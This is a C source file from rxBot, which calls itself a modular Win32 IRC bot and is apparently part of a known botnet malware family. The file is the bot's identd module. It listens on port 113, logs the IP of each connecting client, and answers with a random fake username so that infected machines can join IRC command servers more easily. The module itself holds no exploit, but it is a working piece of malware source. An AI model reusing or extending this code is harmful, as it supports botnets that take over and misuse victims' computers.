/*

    rxBot - a modular IRC bot for Win32
    Copyright (C) 2004

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

*/

#include "includes.h"
#include "functions.h"
#include "externs.h"

#ifndef NO_IDENT

DWORD WINAPI IdentThread(LPVOID param)
{
	char user[12], buffer[IRCLINE];

	int threadnum = (int)param;
	BOOL success = FALSE;

	SOCKET ssock,csock;

	SOCKADDR_IN ssin, csin;
	memset(&ssin, 0, sizeof(ssin));
	ssin.sin_family = AF_INET;
	ssin.sin_port = fhtons(113);
	ssin.sin_addr.s_addr=INADDR_ANY;

	if ((ssock = fsocket(AF_INET, SOCK_STREAM, 0)) != INVALID_SOCKET) {
		threads[threadnum].sock = ssock;
		if (fbind(ssock, (LPSOCKADDR)&ssin, sizeof(ssin)) != SOCKET_ERROR) {
			if (flisten(ssock, 5) != SOCKET_ERROR) {
				int csin_len = sizeof(csin);

				while (1) {
					if ((csock = faccept(ssock,(LPSOCKADDR)&csin,&csin_len)) == INVALID_SOCKET)
						break;

					sprintf(buffer, "[IDENTD]: Client connection from IP: %s:%d.", finet_ntoa(csin.sin_addr), csin.sin_port);
					addlog(buffer);

					if (frecv(csock,buffer,sizeof(buffer),0) != SOCKET_ERROR) {
						Split(buffer,0);

						memset(user, 0, sizeof(user));
						_snprintf(buffer,sizeof(buffer)," : USERID : UNIX : %s\r\n",rndnick(user, LETTERNICK, FALSE));
	
						if (fsend(csock,buffer,strlen(buffer),0) != SOCKET_ERROR)
							success = TRUE;

					}
				}
			}
		}
	}

	if (!success) {
		sprintf(buffer, "[IDENTD]: Error: server failed, returned: <%d>.", fWSAGetLastError());
		addlog(buffer);
	}

	fclosesocket(ssock);
	fclosesocket(csock);
	clearthread(threadnum);

	ExitThread(0);
}
#endif

